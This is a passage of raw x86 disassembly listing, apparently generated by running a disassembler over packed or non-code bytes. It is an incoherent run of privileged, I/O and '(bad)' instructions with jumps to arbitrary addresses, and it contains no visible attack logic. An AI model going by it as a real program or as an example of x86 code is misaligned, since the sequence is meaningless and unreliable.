  41e1c3:	jo     0x41e1d4
  41e1c5:	stos   BYTE PTR es:[edi],al
  41e1c6:	xchg   edi,eax
  41e1c7:	and    DWORD PTR [ebx-0x1fd52522],eax
  41e1cd:	aad    0x61
  41e1cf:	mov    ds:0xd0f9fd82,eax
  41e1d4:	shr    ebp,cl
  41e1d6:	fistp  DWORD PTR [edx-0x68]
  41e1d9:	sti    
  41e1da:	ret    
  41e1db:	lahf   
  41e1dc:	mov    dh,0x4
  41e1de:	int3   
  41e1df:	inc    edi
  41e1e0:	fwait
  41e1e1:	push   cs
  41e1e2:	rcr    DWORD PTR [edi+ebp*8+0x465e53c3],1
  41e1e9:	xchg   BYTE PTR [esi],ch
  41e1eb:	int    0x8c
  41e1ed:	data16 mov al,ds:0xcd0ff430
  41e1f3:	iret   
  41e1f4:	call   0x53d0:0xfdd3f4e0
  41e1fb:	pop    ebp
  41e1fc:	adc    al,0xc7
  41e1fe:	pop    ds
  41e1ff:	pop    ss
  41e200:	xor    al,0x7
  41e202:	repnz sub bh,BYTE PTR [ebp+edi*1-0x51]
  41e207:	and    cl,al
  41e209:	retf   0xbcfb
  41e20c:	cmc    
  41e20d:	jle    0x41e1ae
  41e20f:	add    al,0x2a
  41e211:	mov    edx,0xc644b496
  41e216:	push   edx
  41e217:	push   edx
  41e218:	jl     0x41e298
  41e21a:	nop
  41e21b:	lds    eax,FWORD PTR [ebx-0x2f3bd89b]
  41e221:	aaa    
  41e222:	repz adc al,0xf8
  41e225:	jmp    0x6805:0x8074d509
  41e22c:	lock mov ds:0x2cc08a18,al
  41e232:	imul   esp,DWORD PTR [esi+0x76766a38],0xffffffcc
  41e239:	lods   al,BYTE PTR ds:[esi]
  41e23a:	dec    ecx
  41e23b:	clc    
  41e23c:	xchg   edx,eax
  41e23d:	adc    eax,0xaecef16a
  41e242:	push   0x93a621de
  41e247:	repz scas eax,DWORD PTR es:[edi]
  41e249:	jp     0x41e1e0
  41e24b:	iret   
  41e24c:	inc    bh
  41e24e:	or     al,0x30
  41e250:	ins    BYTE PTR es:[edi],dx
  41e251:	push   eax
  41e252:	push   edi
  41e253:	ret    
  41e254:	jo     0x41e20b
  41e256:	icebp  
  41e257:	pop    edi
  41e258:	push   ebx
  41e259:	pushf  
  41e25a:	jge    0x41e266
  41e25c:	in     eax,0xcb
  41e25e:	sbb    DWORD PTR [edi],esi
  41e260:	jp     0x41e235
  41e262:	js     0x41e2c2
  41e264:	pushf  
  41e265:	stc    
  41e266:	push   0xffffff8a
  41e268:	jno    0x41e251
  41e26a:	xor    al,0xea
  41e26c:	hlt    
  41e26d:	ret    0x215a
  41e270:	sub    eax,0x31521ef4
  41e275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e276:	pop    eax
  41e277:	pop    esi
  41e278:	in     eax,0x4b
  41e27a:	clts   
  41e27c:	cmp    DWORD PTR [ebx-0x28],ebp
  41e27f:	jge    0x41e2cf
  41e281:	ret    
  41e282:	jmp    0x581869e7
  41e287:	cwde   
  41e288:	add    cl,BYTE PTR [ebx-0x3107a949]
  41e28e:	mov    WORD PTR [ebx+0x550a4630],fs
  41e294:	push   ds
  41e295:	add    al,0x4d
  41e297:	or     esp,DWORD PTR [esi+esi*2]
  41e29a:	sbb    al,0x48
  41e29c:	inc    edi
  41e29d:	adc    al,0x55
  41e29f:	dec    edi
  41e2a0:	cmp    bh,BYTE PTR [edi-0x6d6045fc]
  41e2a6:	rol    BYTE PTR [eax],0xd5
  41e2a9:	mov    gs:0x26cc1843,eax
  41e2af:	rcr    BYTE PTR [ebp+0x7e],1
  41e2b2:	or     ebx,DWORD PTR [edx+0x45]
  41e2b5:	add    BYTE PTR [eax],ah
  41e2b7:	xor    al,0x7f
  41e2b9:	push   0x22
  41e2bb:	pusha  
  41e2bc:	js     0x41e258
  41e2be:	loope  0x41e2a2
  41e2c0:	dec    edi
  41e2c1:	jns    0x41e272
  41e2c3:	sub    eax,0xe77cca1b
  41e2c8:	dec    ecx
  41e2c9:	pop    edi
  41e2ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2cb:	push   ebx
  41e2cc:	mov    bh,0xe3
  41e2ce:	repz mov ?,ebx
  41e2d1:	xchg   esp,eax
  41e2d2:	cwde   
  41e2d3:	loopne 0x41e2d3
  41e2d5:	push   eax
  41e2d6:	or     DWORD PTR [edi],edx
  41e2d8:	es imul ebx,edx,0xdc462be3
  41e2df:	add    al,0xce
  41e2e1:	adc    cl,BYTE PTR [ecx+0x54b251]
  41e2e7:	in     eax,0xe6
  41e2e9:	iret   
  41e2ea:	inc    ebx
  41e2eb:	xchg   edi,eax
  41e2ec:	arpl   WORD PTR [eax-0x2a5bb231],sp
  41e2f2:	shl    bh,0xb1
  41e2f5:	test   DWORD PTR [esi],0xb7b55f37
  41e2fb:	xchg   edx,eax
  41e2fc:	adc    al,0x7b
  41e2fe:	adc    al,0x5f
  41e300:	scas   al,BYTE PTR es:[edi]
  41e301:	call   0x6a6c:0x35eab5b4
  41e308:	jp     0x41e343
  41e30a:	sti    
  41e30b:	popa   
  41e30c:	cmp    edx,DWORD PTR [esi-0x5a28d5fb]
  41e312:	jecxz  0x41e384
  41e314:	cmc    
  41e315:	inc    edx
  41e316:	inc    ecx
  41e317:	(bad)  
  41e319:	into   
  41e31a:	dec    edx
  41e31b:	sti    
  41e31c:	add    DWORD PTR [esi+0x46],edi
  41e31f:	sub    BYTE PTR [edx+eiz*4+0x66],0x14
  41e324:	adc    ecx,DWORD PTR [ebx+0x49]
  41e327:	mov    al,0xbd
  41e329:	sbb    al,0xc5
  41e32b:	sar    ecx,1
  41e32d:	mov    bh,0x74
  41e32f:	bound  edx,QWORD PTR [edi]
  41e331:	outs   dx,BYTE PTR ds:[esi]
  41e332:	adc    ecx,DWORD PTR [ebp-0x6ca6d68a]
  41e338:	into   
  41e339:	sub    BYTE PTR [ebx+0x5293c553],ch
  41e33f:	addr16 inc ebp
  41e341:	(bad)
  41e344:	popa   
  41e345:	(bad)  
  41e346:	mov    edi,DWORD PTR [ebx-0x32]
  41e349:	lahf   
  41e34a:	stos   DWORD PTR es:[edi],eax
  41e34b:	mul    BYTE PTR [ebx+esi*2]
  41e34e:	xchg   edx,eax
  41e34f:	jo     0x41e362
  41e351:	jb     0x41e2e6
  41e353:	bound  eax,QWORD PTR [edi+0x71]
  41e356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e357:	push   eax
  41e358:	adc    eax,0xe90e0b37
  41e35d:	cmp    BYTE PTR [eax-0x726f1c42],cl
  41e363:	retf   0x9851
  41e366:	test   DWORD PTR [ebx+0x8],edi
  41e369:	push   esp
  41e36a:	sbb    ebp,DWORD PTR [eax+esi*2+0x3c]
  41e36e:	sahf   
  41e36f:	mov    DWORD PTR [ebx+0x34928c8a],eax
  41e375:	jmp    0x41e3d9
  41e377:	int3   
  41e378:	jbe    0x41e328
  41e37a:	ret    
  41e37b:	cmp    cl,BYTE PTR [edi]
  41e37d:	xchg   DWORD PTR [ebx-0x448cce93],edx
  41e383:	xor    eax,0xab10fc30
  41e388:	mov    DWORD PTR es:[ebx-0x550c603a],ebx
  41e38f:	dec    ecx
  41e390:	sbb    dh,BYTE PTR [esi+0x8]
  41e393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e394:	mov    ebp,0x70da5c84
  41e399:	or     al,0x2c
  41e39b:	dec    ebp
  41e39c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e39d:	(bad)  
  41e39e:	dec    edi
  41e39f:	fnsave [edx-0x31db871e]
  41e3a5:	push   0xffffffc7
  41e3a7:	sub    DWORD PTR [ebx],edx
  41e3a9:	(bad)  
  41e3aa:	cmp    dl,BYTE PTR [edi+0x5f11cd5a]
  41e3b0:	ror    edi,cl
  41e3b2:	xchg   ecx,eax
  41e3b3:	or     eax,0xd808893f
  41e3b8:	or     eax,0xb7d18eec
  41e3bd:	and    eax,0xfc95278a
  41e3c2:	scas   al,BYTE PTR es:[edi]
  41e3c3:	dec    ecx
  41e3c4:	mov    ebp,0xd6421605
  41e3c9:	jae    0x41e37a
  41e3cb:	add    al,0x1d
  41e3cd:	mov    esi,0xa3a7160b
  41e3d2:	mov    al,0xc7
  41e3d4:	cmp    ch,cl
  41e3d6:	jns    0x41e3bb
  41e3d8:	dec    ebx
  41e3d9:	pop    edi
  41e3da:	jo     0x41e3d8
  41e3dc:	icebp  
  41e3dd:	call   0x8e4b127b
  41e3e2:	pop    edi
  41e3e3:	int    0x2f
  41e3e5:	aad    0xab
  41e3e7:	in     eax,0x61
  41e3e9:	fs push ebp
  41e3eb:	inc    edi
  41e3ec:	out    dx,eax
  41e3ed:	into   
  41e3ee:	ja     0x41e41a
  41e3f0:	jne    0x41e405
  41e3f2:	or     bl,BYTE PTR [esi]
  41e3f4:	repnz add dl,BYTE PTR [ebx-0x80]
  41e3f8:	pop    esi
  41e3f9:	push   edx
  41e3fa:	cmp    cl,ah
  41e3fc:	jge    0x41e3d4
  41e3fe:	je     0x41e41b
  41e400:	adc    cl,BYTE PTR [ecx]
  41e402:	jns    0x41e3bc
  41e404:	sbb    dl,ah
  41e406:	retf   0xf4de
  41e409:	pop    eax
  41e40a:	pop    ebx
  41e40b:	movlhps xmm7,xmm3
  41e40e:	cmp    DWORD PTR [edi-0x14],ebx
  41e411:	mov    cs,WORD PTR [ebx+ebp*1-0x2fba6956]
  41e418:	and    ah,bl
  41e41a:	rcl    BYTE PTR [esi-0x18],0x6c
  41e41e:	daa    
  41e41f:	rol    BYTE PTR [eax+0x5b6fd0a2],0xa8
  41e426:	inc    DWORD PTR ds:0xf97123df
  41e42c:	(bad)  
  41e42d:	in     eax,0x39
  41e42f:	mov    ebp,0xba9721cc
  41e434:	fwait
  41e435:	xor    BYTE PTR [ecx-0x5f50343a],bl
  41e43b:	scas   eax,DWORD PTR es:[edi]
  41e43c:	xor    bh,BYTE PTR [edx-0x54]
  41e43f:	and    eax,0x331e7643
  41e444:	pop    es
  41e445:	add    eax,0x7135c3df
  41e44a:	mov    esp,ecx
  41e44c:	enter  0x1e34,0x87
  41e450:	jne    0x41e4bd
  41e452:	out    0x18,al
  41e454:	cmp    BYTE PTR [ebx+0x6f],al
  41e457:	sub    al,0x21
  41e459:	or     dh,BYTE PTR [ebx]
  41e45b:	ins    DWORD PTR es:[edi],dx
  41e45c:	adc    BYTE PTR [edi+0x3f2722b1],cl
  41e462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e463:	jnp    0x41e4b1
  41e465:	mov    al,ds:0x30d31efc
  41e46a:	push   esp
  41e46b:	bound  ecx,QWORD PTR [eax-0xd]
  41e46e:	(bad)  
  41e46f:	into   
  41e470:	fcmovnu st,st(6)
  41e472:	call   0xdace0065
  41e477:	loop   0x41e49b
  41e479:	dec    ebx
  41e47a:	mov    eax,ds:0xa2503d1a
  41e47f:	js     0x41e440
  41e481:	stos   BYTE PTR es:[edi],al
  41e482:	cmp    edi,DWORD PTR [eax-0x49]
  41e485:	neg    BYTE PTR [ebx+0x7c20955f]
  41e48b:	inc    edi
  41e48c:	cld    
  41e48d:	jns    0x41e485
  41e48f:	sub    dl,BYTE PTR [edx+eiz*8+0x0]
  41e493:	dec    ebp
  41e494:	rcr    DWORD PTR [edx+0x3f],1
  41e497:	mov    cl,0xd6
  41e499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e49a:	dec    DWORD PTR [ecx-0x370e625f]
  41e4a0:	aaa    
  41e4a1:	addr16 mov ah,0x7b
  41e4a4:	scas   eax,DWORD PTR es:[edi]
  41e4a5:	or     eax,0xa91e8045
  41e4aa:	adc    BYTE PTR [edi-0x2329e067],ah
  41e4b0:	pop    es
  41e4b1:	and    DWORD PTR [edx+edi*8-0x17],eax
  41e4b5:	dec    ebp
  41e4b6:	mov    al,0x1f
  41e4b8:	pop    ebp
  41e4b9:	xor    al,0xbb
  41e4bb:	mov    edi,0xea462940
  41e4c0:	mov    ebp,0xfdc8e161
  41e4c5:	cli    
  41e4c6:	ja     0x41e519
  41e4c8:	fs aad 0x2c
  41e4cb:	enter  0x4eca,0x4a
  41e4cf:	arpl   di,di
  41e4d1:	mov    edi,0x59fb364e
  41e4d6:	pushf  
  41e4d7:	pop    eax
  41e4d8:	ins    BYTE PTR es:[edi],dx
  41e4d9:	xchg   ebp,eax
  41e4da:	out    dx,eax
  41e4db:	push   esi
  41e4dc:	cmovno esp,edi
  41e4df:	inc    esp
  41e4e0:	xor    al,0xb0
  41e4e2:	mov    ah,0x61
  41e4e4:	adc    eax,0x1a52806f
  41e4e9:	xchg   edi,eax
  41e4ea:	jb     0x41e52f
  41e4ec:	(bad)  
  41e4ed:	cwde   
  41e4ee:	out    0xa,al
  41e4f0:	sub    eax,0xa5c42361
  41e4f5:	jnp    0x41e557
  41e4f7:	add    al,0xe0
  41e4f9:	mov    ds:0x1bce9880,eax
  41e4fe:	inc    esp
  41e4ff:	jae    0x41e4c7
  41e501:	jmp    0xb4cc276a
  41e506:	sub    DWORD PTR [ebp+0x335010cf],edi
  41e50c:	mov    edx,0xc0981525
  41e511:	jbe    0x41e4fe
  41e513:	or     bl,BYTE PTR [ebx-0x7ebf9b06]
  41e519:	push   ss
  41e51a:	outs   dx,DWORD PTR ds:[esi]
  41e51b:	xchg   ah,dl
  41e51d:	sub    BYTE PTR [eax],0x16
  41e520:	dec    edi
  41e521:	mov    ?,WORD PTR [edx+0x62dd9091]
  41e527:	adc    al,0x7d
  41e529:	ror    BYTE PTR ss:[ecx+0x62],cl
  41e52d:	mov    dl,0xc3
  41e52f:	mov    dl,0x38
  41e531:	add    dh,BYTE PTR [ecx]
  41e533:	and    al,0xb3
  41e535:	jge    0x41e4da
  41e537:	sub    DWORD PTR [ebp+0x13],ebp
  41e53a:	add    eax,0xeea0060d
  41e53f:	adc    ebp,DWORD PTR [ebx]
  41e541:	or     ebx,DWORD PTR [ecx+0x40]
  41e544:	add    DWORD PTR [ebx+0x23],esi
  41e547:	jmp    0x9d12:0x688d1d8e
  41e54e:	jl     0x41e534
  41e550:	mov    edi,ecx
  41e552:	fisubr DWORD PTR [ebx-0x4b80d505]
  41e558:	or     al,0xd4
  41e55a:	sbb    esi,esi
  41e55c:	test   BYTE PTR [eax+ebp*2+0x4f],bl
  41e560:	pop    edi
  41e561:	sub    dl,ah
  41e563:	(bad)  
  41e565:	dec    ecx
  41e566:	ja     0x41e506
  41e568:	push   0x40
  41e56a:	fld    QWORD PTR [ecx-0x73346091]
  41e570:	outs   dx,BYTE PTR ds:[esi]
  41e572:	mov    ds:0x77d47368,ax
  41e578:	(bad)  
  41e57a:	in     al,0x20
  41e57c:	loopne 0x41e5f9
  41e57e:	fnstenv [edx]
  41e580:	jecxz  0x41e5b5
  41e582:	rcl    BYTE PTR [ebx+0x166d90fe],cl
  41e588:	mov    BYTE PTR [edi-0x7d],dh
  41e58b:	lea    ebp,[ecx-0x7b]
  41e58e:	int    0x3b
  41e590:	mov    bl,BYTE PTR [eax+0x5e4dc887]
  41e596:	out    dx,eax
  41e597:	xchg   edi,eax
  41e598:	iret   
  41e599:	je     0x41e59b
  41e59b:	mov    bl,BYTE PTR [ecx+eiz*8+0x47]
  41e59f:	sub    ecx,edi
  41e5a1:	fs jmp 0xb349:0xef818490
  41e5a9:	cld    
  41e5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ab:	pop    ebp
  41e5ac:	cmp    DWORD PTR [edi+ebx*1-0x7c48606d],0xffffffd8
  41e5b4:	push   0x56
  41e5b6:	test   eax,0xdcfa810d
  41e5bb:	cmp    eax,0x1ca35681
  41e5c0:	and    bh,BYTE PTR [edi]
  41e5c2:	dec    edx
  41e5c3:	cmp    DWORD PTR [ebx],0x77
  41e5c6:	xor    edx,esi
  41e5c8:	dec    esi
  41e5c9:	cli    
  41e5ca:	adc    BYTE PTR [ecx-0x1fed5e4e],bl
  41e5d0:	push   edx
  41e5d1:	fcomp  QWORD PTR [esi+0x10]
  41e5d4:	inc    esi
  41e5d5:	xchg   edx,eax
  41e5d6:	inc    ecx
  41e5d7:	xor    al,0x6b
  41e5d9:	sub    al,0x9d
  41e5db:	out    dx,al
  41e5dc:	pop    ds
  41e5dd:	in     al,0x9a
  41e5df:	(bad)
  41e5e2:	(bad)  [edx-0x14]
  41e5e5:	pop    es
  41e5e6:	adc    ecx,DWORD PTR [ebx]
  41e5e8:	pop    esp
  41e5e9:	push   cs
  41e5ea:	xchg   ebp,eax
  41e5eb:	sub    esp,esi
  41e5ed:	ja     0x41e620
  41e5ef:	and    bh,BYTE PTR [ecx+ecx*2]
  41e5f2:	(bad)  
  41e5f3:	jne    0x41e647
  41e5f5:	cs add eax,0xfaf3284
  41e5fb:	repnz and ch,BYTE PTR [ebp-0x65]
  41e5ff:	pop    edi
  41e600:	inc    esi
  41e601:	and    cl,ah
  41e603:	xchg   esp,eax
  41e604:	mov    eax,0x5d032d9
  41e609:	shl    BYTE PTR [esi-0xc],0x43
  41e60d:	adc    al,0xe0
  41e60f:	stc    
  41e610:	push   esi
  41e611:	stc    
  41e612:	fld    TBYTE PTR [edi+0x39]
  41e615:	sub    eax,0x6967e6e
  41e61a:	test   dl,ch
  41e61c:	scas   eax,DWORD PTR es:[edi]
  41e61d:	push   ss
  41e61e:	sub    al,0x2f
  41e620:	lods   al,BYTE PTR ds:[esi]
  41e621:	mov    al,ds:0xc0270664
  41e626:	ficom  DWORD PTR [edx]
  41e628:	cmp    eax,0xf399759d
  41e62d:	dec    esp
  41e62e:	sbb    al,0xfc
  41e630:	mov    ds:0xa4fafa71,al
  41e635:	sbb    DWORD PTR [ecx],esp
  41e637:	stos   DWORD PTR es:[edi],eax
  41e638:	cmp    ecx,esi
  41e63a:	cmp    eax,0xd1fc571b
  41e63f:	inc    ebp
  41e640:	push   0x8
  41e642:	pop    esp
  41e643:	and    al,0x1e
  41e645:	lss    ebx,FWORD PTR [edi-0x51]
  41e649:	das    
  41e64a:	dec    esp
  41e64b:	push   ebp
  41e64c:	push   esp
  41e64d:	and    esi,DWORD PTR [eax+edi*8+0x741d504c]
  41e654:	cmp    al,0xc2
  41e656:	aaa    
  41e657:	mov    ch,0x22
  41e659:	outs   dx,BYTE PTR ds:[esi]
  41e65a:	jp     0x41e643
  41e65c:	popf   
  41e65d:	popa   
  41e65e:	or     ecx,ebx
  41e660:	mov    esi,0x424265a
  41e665:	mov    cl,0xe
  41e667:	cli    
  41e668:	js     0x41e664
  41e66a:	adc    al,0x25
  41e66c:	inc    ebp
  41e66d:	stos   BYTE PTR es:[edi],al
  41e66e:	or     DWORD PTR [esi],edi
  41e670:	ds (bad) 
  41e672:	add    eax,esp
  41e674:	mov    esi,0xae04c5f4
  41e679:	inc    esi
  41e67a:	xchg   DWORD PTR [edx],edx
  41e67c:	fisttp QWORD PTR [ebx]
  41e67e:	xor    eax,0xa30a54e5
  41e683:	push   ecx
  41e684:	jle    0x41e65c
  41e686:	mov    dh,ch
  41e688:	mov    eax,0xdf28af7e
  41e68d:	shr    DWORD PTR [eax+ebx*4+0x6bdc72b8],0xb
  41e695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e696:	add    al,0x58
  41e698:	push   ecx
  41e699:	jge    0x41e6a2
  41e69b:	mov    edx,0x7fb8f93f
  41e6a0:	sub    ch,BYTE PTR [ebx]
  41e6a2:	scas   al,BYTE PTR es:[edi]
  41e6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6a4:	mov    ds:0xae01f621,eax
  41e6a9:	inc    ebx
  41e6aa:	das    
  41e6ab:	dec    ebp
  41e6ac:	jl     0x41e6ca
  41e6ae:	fbld   TBYTE PTR [eax+edi*4-0x77b89924]
  41e6b5:	or     ch,BYTE PTR [eax+0x50]
  41e6b8:	adc    ah,BYTE PTR [ebx]
  41e6ba:	pop    es
  41e6bb:	iret   
  41e6bc:	dec    edi
  41e6bd:	or     BYTE PTR [eax],ch
  41e6bf:	lods   al,BYTE PTR ds:[esi]
  41e6c0:	sub    ebx,0xb3970e4c
  41e6c6:	test   BYTE PTR [esp+eiz*2-0x62],0x77
  41e6cb:	push   ebx
  41e6cc:	imul   ecx,esp,0x54
  41e6cf:	inc    esi
  41e6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6d1:	das    
  41e6d2:	xchg   BYTE PTR [esi+0x23],dl
  41e6d5:	push   ss
  41e6d6:	jb     0x41e68f
  41e6d8:	addr16 jl 0x41e70f
  41e6db:	mov    cl,0x6a
  41e6dd:	pop    edi
  41e6de:	push   eax
  41e6df:	popf   
  41e6e0:	pop    edi
  41e6e1:	jle    0x41e718
  41e6e3:	sbb    DWORD PTR [edx-0x4],ebx
  41e6e6:	pop    ds
  41e6e7:	mov    bh,0xba
  41e6e9:	mov    ebp,0x6cdca4a8
  41e6ee:	gs mov bh,0x33
  41e6f1:	lahf   
  41e6f2:	in     al,dx
  41e6f3:	fld    TBYTE PTR [ebx+0x22]
  41e6f6:	popa   
  41e6f7:	xchg   esp,eax
  41e6f8:	adc    bl,BYTE PTR [ecx]
  41e6fa:	adc    ch,BYTE PTR [ebp-0x3e]
  41e6fd:	adc    eax,0x40
  41e700:	and    ebx,DWORD PTR [eax]
  41e702:	popf   
  41e703:	jl     0x41e70c
  41e705:	jne    0x41e6a1
  41e707:	or     BYTE PTR [ecx],al
  41e709:	push   0xd2b8aa19
  41e70e:	(bad)  
  41e710:	mov    fs,esi
  41e712:	add    al,0x18
  41e714:	push   es
  41e715:	dec    ebx
  41e716:	pop    eax
  41e717:	inc    ebx
  41e718:	lods   eax,DWORD PTR ds:[esi]
  41e719:	mov    BYTE PTR [ecx-0x1c],0x75
  41e71d:	aaa    
  41e71e:	(bad)  
  41e71f:	fld    TBYTE PTR [ebx+0x267827ac]
  41e725:	adc    BYTE PTR ds:0xbdf88166,dl
  41e72b:	in     eax,0xc9
  41e72d:	aad    0x28
  41e72f:	push   ds
  41e730:	popf   
  41e731:	popf   
  41e732:	mov    ah,0x1c
  41e734:	xchg   BYTE PTR [eax-0x10],dh
  41e737:	adc    al,0x9b
  41e739:	fld    DWORD PTR [ebx]
  41e73b:	int    0x8f
  41e73d:	in     eax,0xad
  41e73f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e740:	leave  
  41e741:	fdivr  st,st(5)
  41e743:	stc    
  41e744:	inc    esp
  41e745:	int3   
  41e746:	outs   dx,DWORD PTR ds:[esi]
  41e747:	and    cl,dh
  41e749:	cmp    BYTE PTR [esi],cl
  41e74b:	mov    ch,0xee
  41e74d:	jp     0x41e70e
  41e74f:	cmp    al,0x73
  41e751:	pop    esi
  41e752:	das    
  41e753:	dec    esi
  41e754:	data16 je 0x41e79f
  41e757:	or     bh,BYTE PTR [ebx]
  41e759:	cmp    BYTE PTR [ebp+edi*1-0x42],ch
  41e75d:	sub    eax,0x4d91b768
  41e762:	mov    ebx,0xd8ee32da
  41e767:	das    
  41e768:	ins    DWORD PTR es:[edi],dx
  41e769:	mov    cl,0xab
  41e76b:	out    0x1e,al
  41e76d:	inc    edi
  41e76e:	add    BYTE PTR [edx-0x1e2c4a97],bh
  41e774:	pop    ebp
  41e775:	push   0x17
  41e777:	xor    eax,0x59efc836
  41e77c:	stos   DWORD PTR es:[edi],eax
  41e77d:	push   ss
  41e77e:	xchg   esi,eax
  41e77f:	jg     0x41e752
  41e781:	out    0x49,eax
  41e783:	push   esp
  41e784:	sbb    ecx,DWORD PTR ds:0x184fd59f
  41e78a:	sar    DWORD PTR [edx+edx*8],0xd
  41e78e:	ret    
  41e78f:	or     al,0xa1
  41e791:	xchg   edx,eax
  41e792:	sub    al,0x1c
  41e794:	mov    eax,ds:0xe5aba690
  41e799:	std    
  41e79a:	inc    ecx
  41e79b:	pop    ebp
  41e79c:	adc    DWORD PTR [ecx+0x6ac4e180],edx
  41e7a2:	sub    ebx,edx
  41e7a4:	push   0xffffff97
  41e7a6:	jb     0x41e75a
  41e7a8:	(bad)  
  41e7a9:	frstor [edi-0x24]
  41e7ac:	imul   esi,esp,0xc6e2b30e
  41e7b2:	push   0x6e
  41e7b4:	or     bl,dh
  41e7b6:	and    BYTE PTR ds:0x3c17d413,bl
  41e7bc:	ins    DWORD PTR es:[edi],dx
  41e7bd:	bound  edx,QWORD PTR [ebp+eax*2-0x6f14b9be]
  41e7c4:	pop    ss
  41e7c5:	pop    ebp
  41e7c6:	mov    edx,0xefdca1ed
  41e7cb:	int3   
  41e7cc:	pop    edi
  41e7cd:	sbb    BYTE PTR [ebp+ecx*1+0x2c],al
  41e7d1:	mov    bh,0xf2
  41e7d3:	ror    ah,1
  41e7d5:	test   al,0x58
  41e7d7:	hlt    
  41e7d8:	add    eax,DWORD PTR [ebx-0x5f]
  41e7db:	or     DWORD PTR [edx-0x32],ebx
  41e7de:	mov    cl,0xc8
  41e7e0:	mov    bh,0x5b
  41e7e2:	cs and eax,0x73afe95a
  41e7e8:	fdivrp st(7),st
  41e7ea:	pop    edi
  41e7eb:	xor    ch,cl
  41e7ed:	call   0xde18:0xcad1d8cd
  41e7f4:	cmp    al,0xa8
  41e7f6:	jno    0x41e80e
  41e7f8:	in     eax,0x48
  41e7fa:	(bad)  
  41e7fb:	in     al,dx
  41e7fc:	pop    ecx
  41e7fd:	inc    esi
  41e7fe:	aad    0xcd
  41e800:	das    
  41e801:	mov    dh,0xa9
  41e803:	cmovo  ecx,edi
  41e806:	jl     0x41e84f
  41e808:	out    0x8b,al
  41e80a:	mov    DWORD PTR [ebp+0x26],ebp
  41e80d:	xchg   BYTE PTR [ecx+0x5f],bl
  41e810:	dec    ecx
  41e811:	pop    ecx
  41e812:	iret   
  41e813:	xchg   BYTE PTR [edi-0x75ee03ad],al
  41e819:	aad    0xd1
  41e81b:	sbb    eax,0xaeb97690
  41e820:	fnstsw WORD PTR [eax+0x39]
  41e823:	mov    cl,0x67
  41e825:	dec    eax
  41e826:	dec    esp
  41e827:	mov    al,ds:0xfd13328b
  41e82c:	scas   eax,DWORD PTR es:[edi]
  41e82d:	les    ebx,FWORD PTR [ebp-0x73]
  41e830:	or     al,0xea
  41e832:	xchg   ecx,eax
  41e833:	adc    DWORD PTR gs:[edi-0x6fc58b61],edi
  41e83a:	adc    eax,0x9e793fab
  41e83f:	clc    
  41e840:	imul   eax,DWORD PTR [ebx+edx*4+0x6f4c0400],0x69c90ca8
  41e84b:	sub    ebx,DWORD PTR [esp+edi*8+0x45]
  41e84f:	dec    ebx
  41e850:	fmul   st,st(3)
  41e852:	stos   BYTE PTR es:[edi],al
  41e853:	add    ah,bl
  41e855:	cs loop 0x41e889
  41e858:	arpl   WORD PTR [ebp-0x29],ax
  41e85b:	jbe    0x41e8c2
  41e85d:	cs dec esp
  41e85f:	fdivr  QWORD PTR [ecx+0x3d]
  41e862:	jnp    0x41e7f5
  41e864:	mov    dh,0xb5
  41e866:	in     al,0xf0
  41e868:	push   ecx
  41e869:	rcl    DWORD PTR [edx+0x593ebd71],cl
  41e86f:	int3   
  41e870:	pusha  
  41e871:	fwait
  41e872:	sbb    eax,0x205e9a7
  41e877:	push   0x556ef159
  41e87c:	es mov ch,0x8c
  41e87f:	xor    bl,dh
  41e881:	fldenv [ebx+eax*2]
  41e884:	dec    ebp
  41e885:	dec    eax
  41e887:	and    dl,al
  41e889:	fidivr DWORD PTR [edi+0x42]
  41e88c:	test   eax,0x93a1a895
  41e891:	rcr    BYTE PTR [ebp-0x77],cl
  41e894:	pop    ebx
  41e895:	sub    cl,bl
  41e897:	(bad)  
  41e898:	aas    
  41e899:	xor    al,0x37
  41e89b:	push   es
  41e89c:	(bad)  [ebp+0x46]
  41e89f:	pop    ebx
  41e8a0:	ficomp DWORD PTR [ecx]
  41e8a2:	mov    ebx,0xf6e68d17
  41e8a7:	jne    0x41e891
  41e8a9:	fldenv [ebp-0x26]
  41e8ac:	call   0x1609:0xcf17e12e
  41e8b3:	push   esi
  41e8b4:	xchg   DWORD PTR ds:0xb3517dc1,ebx
  41e8ba:	int    0xa2
  41e8bc:	jno    0x41e854
  41e8be:	xchg   edx,eax
  41e8bf:	push   ds
  41e8c0:	jge    0x41e93b
  41e8c2:	popa   
  41e8c3:	push   edx
  41e8c4:	fmul   QWORD PTR [ebx+eax*4]
  41e8c7:	xchg   ecx,eax
  41e8c8:	rol    DWORD PTR [esi+0x28],cl
  41e8cb:	loopne 0x41e93c
  41e8cd:	fidiv  WORD PTR [edi]
  41e8cf:	pop    edx
  41e8d0:	xchg   ebp,eax
  41e8d1:	stos   DWORD PTR es:[edi],eax
  41e8d2:	mov    ds:0xd76b6e16,eax
  41e8d7:	adc    ebp,DWORD PTR [ebp+0x64cfa094]
  41e8dd:	xlat   BYTE PTR ds:[ebx]
  41e8de:	xchg   esp,eax
  41e8df:	xchg   esi,eax
  41e8e0:	(bad)  
  41e8e1:	stc    
  41e8e2:	fs sti 
  41e8e4:	sub    ah,BYTE PTR [eax]
  41e8e6:	sar    DWORD PTR [ecx],cl
  41e8e8:	out    dx,al
  41e8e9:	je     0x41e91b
  41e8eb:	out    0xdc,al
  41e8ed:	and    DWORD PTR [esi],ecx
  41e8ef:	adc    dh,BYTE PTR [edx]
  41e8f1:	inc    ebx
  41e8f2:	mov    bl,0xa5
  41e8f4:	sbb    DWORD PTR [edx-0x2d],eax
  41e8f7:	sti    
  41e8f8:	and    DWORD PTR ds:0x92e714fc,ebp
  41e8fe:	push   ebx
  41e8ff:	gs mov bl,ch
  41e902:	pop    edx
  41e903:	dec    ebp
  41e904:	inc    ebp
  41e905:	loope  0x41e97f
  41e907:	ret    
  41e908:	iret   
  41e909:	je     0x41e896
